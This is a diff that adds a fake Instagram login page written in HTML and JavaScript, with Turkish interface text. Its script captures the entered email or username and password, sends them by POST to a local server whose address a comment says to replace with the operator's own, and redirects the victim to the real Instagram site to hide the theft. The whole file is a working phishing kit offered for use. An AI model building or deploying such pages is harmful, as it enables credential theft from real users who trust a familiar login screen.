@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
+    <title>Instagram</title>
+    
+</head>
+<body>
+    
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <img class="custom-image" src="./img//instagram-celular.png" alt="Description of your image" />
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+
+                <!-- Form -->
+                <form id="loginForm" onsubmit="return submitLoginForm(event);" method="POST">
+                    <label for="email" class="sr-only">Telefon numarası, kullanıcı adı veya e-posta</label>
+                    <input id="email" name="email" placeholder="Telefon numarası, kullanıcı adı veya e-posta" />
+
+                    <label for="password" class="sr-only">Şifre</label>
+                    <input id="password" name="password" type="password" placeholder="Şifre" />
+
+                    <!-- Buton tipini submit olarak değiştir -->
+                    <button type="submit">Giriş yap</button>
+                </form>
+
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">YADA</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>Facebook ile Giriş Yap</a>
+                    </div>
+                    <a href="#">Şifreni mi unuttun?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Heabın Yok mu?</p>
+                <a href="#">Kaydol</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Uygulamayı indir.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
+                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
+                </div>
+            </div>
+        </section>
+    </main>
+    
+    <footer>    
+        <ul class="flex flex-wrap justify-content-center">
+            <li><a href="#">Meta</Meta></a></li>
+            <li><a href="#">Hakkında</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">İş Fırsatları</a></li>
+            <li><a href="#">Yardım</a></li>
+            <li><a href="#">API</a></li>
+            <li><a href="#">Gizlilik</a></li>
+            <li><a href="#">Koşullar</a></li>
+            <li><a href="#">Meta Verified</a></li>
+            <li><a href="#">Threads</a></li>
+            <li><a href="#">Konumlar</a></li>
+        </ul>
+        <p class="copyright">© 2024 Instagram from Meta</p>
+    </footer>
+
+    <!-- JavaScript kodu -->
+    <script>
+        function submitLoginForm(event) {
+            // Formun varsayılan gönderme davranışını engelle
+            event.preventDefault();
+
+            // Formdaki giriş alanlarından verileri al
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            // POST isteği için hedef URL
+            var url = "http://127.0.0.1:8080"; // Sunucunun URL'sini buraya ekleyin
+
+            // POST verisi oluştur
+            var data = new FormData();
+            data.append("email", email);
+            data.append("password", password);
+
+            // POST isteği oluştur
+            var request = new XMLHttpRequest();
+            request.open("POST", url, true);
+
+            // gerçek instangram sayfasını aç
+            window.location.href = "https://www.instagram.com";
+
+
+
+            // POST verisini gönder
+            request.send(data);
+        }
+    </script>
+    
+</body>
+</html>
